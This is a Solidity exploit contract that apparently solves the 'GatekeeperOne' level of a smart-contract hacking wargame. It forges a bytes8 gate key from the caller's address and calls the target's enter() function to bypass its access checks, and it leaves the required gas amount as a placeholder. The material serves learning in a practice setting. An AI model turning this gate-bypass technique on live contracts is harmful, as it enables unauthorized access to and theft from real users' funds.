// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import "hardhat/console.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneExploit {

    bytes8 public gateKey;
    IGatekeeperOne public gkOne;

    constructor(address gkAddress) public {
        gkOne = IGatekeeperOne(gkAddress);
    }

    function setKey() external {
        gateKey = bytes8(uint64(uint16(msg.sender)) + uint64(2 ** 32));
        // console.log(uint32(uint64(gateKey)));
        // console.log(uint16(uint64(gateKey)));
        // console.log(uint32(uint64(gateKey)) == uint16(uint64(gateKey)));
        // console.log(uint64(gateKey));
        // console.log(uint32(uint64(gateKey)) != uint64(gateKey));
        // console.log(uint16(msg.sender));
        // console.log(uint32(uint64(gateKey)) == uint16(msg.sender));
    }
    
    // @dev This function should be called with exactly X gas to break the GatekeeperOne contract
    function breakIn() external returns (bool) {
        return gkOne.enter(gateKey);
    }

    
}